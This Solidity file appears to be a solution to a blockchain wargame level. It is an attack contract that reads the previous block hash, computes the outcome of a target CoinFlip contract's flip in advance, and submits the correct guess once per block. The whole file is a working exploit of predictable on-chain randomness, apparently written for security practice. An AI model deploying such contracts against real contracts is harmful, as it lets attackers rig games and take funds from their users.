// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private lastHash;
    uint8 successCount = 0;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert("SAME_BLOCK");
        }
        lastHash = blockValue;

        uint256 coinFlip = blockValue / FACTOR;
        CoinFlip cf = CoinFlip(contractAddress);

        cf.flip(coinFlip == 1);
    }
}
